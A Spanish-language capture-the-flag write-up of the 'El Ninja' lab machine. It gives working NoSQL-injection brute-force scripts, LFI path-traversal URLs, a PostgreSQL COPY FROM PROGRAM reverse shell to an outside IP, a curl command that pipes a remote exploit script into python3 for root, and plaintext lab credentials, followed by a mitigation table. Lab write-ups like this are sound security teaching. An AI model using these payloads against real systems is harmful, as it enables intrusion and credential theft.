# 🥷 El Ninja - Writeup Completo

![Banner](https://img.shields.io/badge/Dificultad-Media-yellow) ![Status](https://img.shields.io/badge/Estado-Completado-brightgreen) ![Root](https://img.shields.io/badge/Root-Obtenido-red)

---

## 📋 Índice

- [Descripción](#descripción)
- [Reconocimiento Inicial](#reconocimiento-inicial)
- [Enumeración de Puertos](#enumeración-de-puertos)
- [Explotación](#explotación)
- [Escalada de Privilegios](#escalada-de-privilegios)
- [Conclusiones](#conclusiones)

---

## 🎯 Descripción

**El Ninja** es un laboratorio de seguridad que simula una infraestructura de la organización "THL Ninjas". La máquina objetivo contiene múltiples vectores de ataque incluyendo inyección NoSQL, LFI, acceso a APIs y RCE a través de PostgreSQL.

**Objetivo Final:** Obtener acceso root a la máquina objetivo.

---

## 🔍 Reconocimiento Inicial

### Descubrimiento de Host

```bash
sudo arp-scan --local
```

**Resultado:** IP objetivo identificada: `192.168.91.208`

### Verificación de Conectividad

```bash
ping -c2 192.168.91.208
```

✅ **Conectividad confirmada** | TTL=64 → Sistema Linux

---

## 🔌 Enumeración de Puertos

### Escaneo TCP Completo

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 192.168.91.208
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| **22** | SSH | OpenSSH 9.2p1 |
| **80** | HTTP | Nginx 1.22.1 |
| **1337** | HTTP | Uvicorn |
| **5000** | HTTP | Flask/Werkzeug 3.1.8 |
| **5432** | PostgreSQL | 15.16 |
| **9999** | Custom | Python Server |

### Escaneo UDP

```bash
nmap -sU -p 53,123,161,500,514,520,623,1434,1900,4500,49152 192.168.91.208
```

**Hallazgo importante:** Puerto 161 (SNMP) abierto

---

## 🎪 Explotación

### 1️⃣ Enumeración SNMP

```bash
snmpwalk -v2c -c public 192.168.91.208
```

**Información crítica obtenida:**
```
Header: X-Api-Key
Endpoint: /api/v1/internal/search
```

### 2️⃣ Inyección NoSQL (Puerto 9999)

Identificación de vulnerabilidad de inyección en el servidor de autenticación:

```bash
nc 192.168.91.208 9999
[+] Username: wvverez
[+] Password: ' || '1'=='1
[+] Login Successful
```

**Extracción de usuarios mediante fuerza bruta:**

```bash
#!/bin/bash
H=192.168.91.208; P=9999; D=/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
cat "$D" | while read u; do
 printf "\r[+] Probando: %-30s" "$u"
 echo -e "wvverez\n' || this.username == '$u' && '1'=='1\n" | nc $H $P 2>/dev/null | grep -q "Successful" && echo -e "\n[+] ENCONTRADO: $u"
done
```

✅ **Usuario encontrado:** `jerry`

**Extracción de contraseña mediante ataque de posición:**

```bash
#!/bin/bash
H=192.168.91.208; P=9999; U="jerry"; PASS=""
CHARS="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz$%!&"
for i in {0..30}; do
 for c in $(echo $CHARS | grep -o .); do
  printf "\r[+] Probando posición %d: %s%s" $i "$PASS" "$c"
  R=$(echo -e "wvverez\n' || (this.username == '$U' && this.password[$i] == '$c') && '1'=='1\n" | nc $H $P 2>/dev/null)
  if echo "$R" | grep -q "Successful"; then PASS="${PASS}${c}"; break; fi
 done
done
echo -e "\n[+] Password: $PASS"
```

✅ **Contraseña obtenida:** `Meg4SUp3rPassw$%!dthl`

### 3️⃣ Acceso a la API (Puerto 1337)

```bash
curl -sX GET 'http://192.168.91.208:1337/api/v1/internal/search?q=' \
  -H 'X-Api-Key: jerry:Meg4SUp3rPassw$%!dthl' | jq
```

**Credenciales extraídas:**
```json
[
  {"username": "harry", "password": "th3THLninj4p4sss3%cret!", "role": "admin"},
  {"username": "wvverez", "password": "4lBus_P3rc1v4l!Wulf", "role": "user"},
  {"username": "loxy", "password": "Gr4ng3r_Bk$M4g1c!", "role": "user"}
]
```

### 4️⃣ Local File Inclusion (LFI) - Puerto 5000

Acceso al dashboard con credenciales de `harry`:

```
http://192.168.91.208:5000/dashboard?list=../../../etc/passwd
```

**Lectura de archivos de aplicación:**

```
http://192.168.91.208:5000/dashboard?list=../app.py
http://192.168.91.208:5000/dashboard?list=../config.py
http://192.168.91.208:5000/dashboard?list=../db.json
```

**Credenciales de PostgreSQL obtenidas:**
```json
{
  "engine": "postgresql",
  "username": "superadmin",
  "password": "THLDKJNABDdhadasdada11111edd0",
  "database": "thlninjas_internal"
}
```

---

## 🚀 Escalada de Privilegios

### Acceso a PostgreSQL

```bash
psql -h 192.168.91.208 -U superadmin -d thlninjas_internal
```

### RCE vía COPY FROM PROGRAM

```sql
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.91.191/4444 0>&1"';
```

### Explotación de CVE-2026-31431

```bash
curl -s https://raw.githubusercontent.com/wvverez/CVE-2026-31431-Copy-Fail/refs/heads/main/poc.py | python3 && su
```

```bash
postgres@debian:~$ id
uid=0(root) gid=112(postgres) groups=112(postgres),109(ssl-cert)

postgres@debian:~$ whoami
root
```

✅ **¡ROOT OBTENIDO!**

---

## 📊 Cadena de Ataque Resumida

```
SNMP Enumeration
    ↓
NoSQL Injection (Puerto 9999)
    ↓
Extracción de credenciales (jerry)
    ↓
API Access (Puerto 1337)
    ↓
Más credenciales (harry)
    ↓
LFI (Puerto 5000)
    ↓
Credenciales PostgreSQL
    ↓
RCE vía COPY FROM PROGRAM
    ↓
CVE-2026-31431 Privilege Escalation
    ↓
ROOT 🎉
```

---

## 🛡️ Lecciones de Seguridad

| Vulnerabilidad | Impacto | Mitigación |
|---|---|---|
| SNMP sin restricciones | Información sensible expuesta | Deshabilitar SNMP o restringir acceso |
| Inyección NoSQL | Bypass de autenticación | Validar y sanitizar inputs |
| LFI sin restricciones | Acceso a archivos del sistema | Usar whitelist de rutas |
| PostgreSQL con RCE | Ejecución de comandos | Deshabilitar COPY FROM PROGRAM |
| Kernel vulnerable | Escalada de privilegios | Mantener sistema actualizado |

---

## 🏆 Conclusión

**El Ninja** demuestra la importancia de:
- ✅ Validación rigurosa de inputs
- ✅ Principio de menor privilegio
- ✅ Restricción de servicios innecesarios
- ✅ Actualización de dependencias
- ✅ Segmentación de red

**Dificultad:** ⭐⭐⭐ (Media)  
**Tiempo estimado:** 2-3 horas  
**Técnicas:** SNMP, NoSQL Injection, LFI, API Exploitation, PostgreSQL RCE, Kernel Exploit

---

**Autor:** Análisis de Seguridad  
**Fecha:** 2026-04-28  
**Estado:** ✅ Completado
